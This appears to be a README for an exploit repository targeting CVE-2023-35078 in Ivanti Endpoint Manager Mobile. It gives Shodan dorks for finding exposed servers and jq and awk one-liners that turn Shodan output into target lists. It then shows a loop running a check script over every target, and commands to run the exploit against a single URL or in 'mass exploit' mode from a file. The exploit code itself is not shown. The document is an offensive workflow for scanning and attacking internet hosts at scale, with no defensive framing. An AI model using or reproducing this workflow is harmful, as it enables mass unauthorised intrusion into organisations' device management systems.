# CVE-2023-35078
Ivanti Endpoint Manager Mobile exploit <br/>

- Shodan dorks: <br/>
```
http.favicon.hash:362091310
```
```
http.favicon.hash:545827989
```
```
path=/mifs
```
- Transform shodan json to data <br/>
```
jq -cr 'select(.http.favicon.hash == 362091310) | [ if .ssl? then "https://" else "http://" end , (.ip_str) + ":" + (.port|tostring)] | add' shodan.json > data_file
```
```
jq -cr 'select(.http.favicon.hash == 545827989) | [ if .ssl? then "https://" else "http://" end , (.ip_str) + ":" + (.port|tostring)] | add' shodan.json > data_file
```
```
python3 shodan-parser.py -o temp_data_file shodan.json
```
```
awk '{print "https://"$0}' temp_data_file > data_file
```
- How run check. <br/>

   The format of the data_file should be as follows: **_http://ip_addr:port_** or **_https://ip_addr:port_** <br/> 
```
chmod +x check.sh; while read line; do ./check.sh $line; done < data_file
```
- Setup requirements <br/>
```
pip install -r requirements.txt
```
- Run exploit single address . <br/>
```
python exploit.py -u http://
```
- Run mass exploit . <br/>
```
python exploit.py -f urls.txt
```
